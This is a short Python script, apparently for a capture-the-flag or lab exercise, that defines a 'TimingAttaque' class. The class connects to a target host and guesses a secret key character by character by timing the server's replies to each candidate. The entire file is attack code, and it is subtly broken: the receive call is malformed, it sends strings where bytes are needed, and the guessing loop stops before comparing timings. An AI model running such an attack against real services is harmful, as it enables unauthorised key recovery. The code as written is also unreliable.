import socket
import time

class TimingAttaque:
  
  def __init__( self, target_ip, target_port ):
    self.target_ip = target_ip
    self.target_port = target_port
    self.buffer_size = 4096

    self.caracteres = '0123456789-'

    self.key = ''
    self.char_found = ''
    self.min_time = 0
    self.data = ''

    self.debut = 0
    self.fin = 0
  
  def create_socket( self ):
    self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.client.connect( (self.target_ip, self.target_port) )
  
  def test_single_chars( self, letter ):
    
      self.client.send( self.key + letter )
      self.debut = time.time()
      self.data = self.client( self.buffer_size )
      self.fin = time.time()
      diff = self.fin - self.debut
      return diff
  
  def test_global_key( self ):
    for letter in self.caracteres:
      diff = self.test_single_chars( letter )
      
